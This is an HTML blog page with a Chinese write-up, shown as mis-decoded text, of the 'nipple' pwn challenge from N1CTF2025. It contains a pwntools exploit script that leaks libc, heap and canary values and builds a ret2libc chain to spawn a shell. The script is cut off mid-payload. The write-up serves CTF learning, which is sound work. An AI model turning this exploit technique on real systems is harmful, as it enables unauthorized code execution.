<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "åˆ‡æ¢ä¸ºæµ…è‰²ä¸»é¢˜" : "åˆ‡æ¢ä¸ºæ·±è‰²ä¸»é¢˜");
            if (label) {
                label.textContent = isDark ? "æ·±è‰²" : "æµ…è‰²";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>N1CTF2025 Writeup | èŠ±ç›†</title><meta name="author" content="LittFlower"/><meta property="og:title" content="N1CTF2025 Writeup | èŠ±ç›†"/><meta property="og:site_name" content="èŠ±ç›†"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/N1CTF-2025-Pwn-Writeup/"/><link rel="alternate" type="application/rss+xml" title="èŠ±ç›†" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>å†…å®¹</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>å›åˆ°é¡¶éƒ¨</a></h3><button type="button" data-theme-toggle="true" aria-label="åˆ‡æ¢äº®æš—ä¸»é¢˜" aria-pressed="false" title="åˆ‡æ¢ä¸»é¢˜" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>Â Â <span data-theme-toggle-label="true" class="theme-toggle-label">æµ…è‰²</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt/><span>README.mdx</span></a><div class="file-meta"><span>18.5 KiB</span><span class="file-meta-date">2025-11-05 15:29</span></div></div><div class="file"><a href="./ubuntu-amd64-libstdc++.sig" class="file-link"><img src="/icons/text.png" alt/><span>ubuntu-amd64-libstdc++.sig</span></a><div class="file-meta"><span>760.2 KiB</span><span class="file-meta-date">1970-01-01 07:59</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="n1ctf2025-pwn-writeup" class="scroll-target"><a href="#n1ctf2025-pwn-writeup"><code class="hash inline-code">#</code>N1CTF2025 Pwn Writeup</a></h1>
<p>å¥½å¥½ç©çš„æ¯”èµ›ï¼ˆx</p>
<h2 id="nipple" class="scroll-target"><a href="#nipple"><code class="hash inline-code">#</code>nipple</a></h2>
<p>é™„ä»¶ç”¨ ida æ‰“å¼€ä¹‹åè¿”ç°å¾ˆğŸ’©ï¼Œc++ å†™çš„ï¼Œéå¸¸ä¸å¥½çœ‹ï¼Œä½†æ˜¯ä»£ç é‡ä¸å¤§ï¼Œç›´æ¥ä¸¢ç»™ AI åˆ†æä¸€ä¸‹ã€‚</p>
<p>AI å¤ªå¥½ç”¨äº†ä½ çŸ¥é“å—ï¼ŒåŸºæœ¬ä¸Šè¿™é“é¢˜çš„ä¸‰ä¸ªæ´ï¼šä¿¡æ¯æ³„æ¼ã€æ ˆæº¢å‡ºã€å †æº¢å‡ºéƒ½æ‰¾åˆ°äº†ã€‚</p>
<p>ä¿¡æ¯æ³„æ¼æ˜¯æ¯æ¬¡ crate åˆ›å»ºåæ²¡æœ‰æ¸…ç©ºï¼Œåˆ©ç”¨ show å¯ä»¥æ³„æ¼ pie å’Œ libcã€‚ä½†æ˜¯ repack åŠŸèƒ½æœ‰ç‚¹å˜æ€ï¼Œå®ƒä¼šæŠŠå½¢å¦‚ 0x61 è¿™ç§å•å­—èŠ‚æ‹†åˆ†æˆ 0x06 å’Œ 0x01 åˆ†åˆ«å†™å…¥ï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•åœ¨å †ä¸Šå†™å…¥æŒ‡é’ˆäº†ã€‚</p>
<p>é‚£ tcache posioning åŸºæœ¬æ‰“ä¸äº†äº†ï¼Œè€ƒè™‘æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ canaryï¼Œæ€ä¹ˆæ³„æ¼å‘¢.jpg</p>
<p>å‘ç°å¦‚æœé€šè¿‡ chunk overlap æŠŠ tcache chunk çš„ fd å’Œ canary é‡å èµ·æ¥ï¼Œåœ¨åŠ å¯†å‡½æ•°æ—¶ï¼Œå°±ä¼šæŠŠ canary çš„æ¯ä¸ªå­—èŠ‚çš„ä½åŠå­—èŠ‚å’Œ fd çš„é«˜åŠå­—èŠ‚æ‹¼èµ·æ¥ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠ canary æœ€ä½ä½çš„ <code class="inline-code">\x00</code> ç›–æ‰ï¼Œç„¶åå°± leak å‡ºæ¥äº†ã€‚</p>
<p>åé¢æ‰“ ret2libc å°±è¡Œã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> os</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./attachment</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">BIN</span><span style="color:#999999"> =</span><span style="color:#B5695977"> '</span><span style="color:#B56959">./attachment</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">HOST</span><span style="color:#999999"> =</span><span style="color:#393A34"> os</span><span style="color:#999999">.</span><span style="color:#393A34">environ</span><span style="color:#999999">.</span><span style="color:#393A34">get</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">HOST</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">PORT</span><span style="color:#999999"> =</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">os</span><span style="color:#999999">.</span><span style="color:#393A34">environ</span><span style="color:#999999">.</span><span style="color:#393A34">get</span><span style="color:#1e754f">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">PORT</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">0</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io = remote("60.205.163.215", 36593)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">BIN</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    breakrva 0x2a5f</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#393A34"> n</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Choice:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Length</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">n</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Data:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">[OK]</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> inspect</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#393A34"> i</span><span style="color:#AB5959">=</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Choice:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">2</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Index:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">i</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> repack</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#393A34"> i</span><span style="color:#999999">,</span><span style="color:#393A34"> n</span><span style="color:#999999">,</span><span style="color:#393A34"> data</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Choice:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">4</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Index:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">i</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Length</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">n</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Data:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">[OK]</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#998418"> quit</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">7</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> poc_leak</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> spawn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1024</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    leak </span><span style="color:#999999">=</span><span style="color:#393A34"> inspect</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'leak len=</span><span style="color:#1e754f">{</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">leak</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">'</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    quit</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> poc_heap</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> spawn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    repack</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 22</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">B</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2F798A">21</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    quit</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> poc_stack</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> spawn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 64</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Choice:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">4</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Index:</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">0</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Length</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">128</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Data:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">C</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2F798A">127</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">500</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">inspect</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x0a</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#AB5959">-</span><span style="color:#2F798A">7</span><span style="color:#999999">:</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">203b20</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    new</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">inspect</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">heap_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x0a</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#AB5959">-</span><span style="color:#2F798A">6</span><span style="color:#999999">:</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 12</span><br><span style="color:#393A34">repack</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x0a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x0a</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # 35CD</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">heap_leak</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">libc_base</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">inspect</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">canary </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x06\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">canary</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000010f78b</span><span style="color:#AB5959">+</span><span style="color:#393A34">libc_base</span><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc_base</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002882f</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> 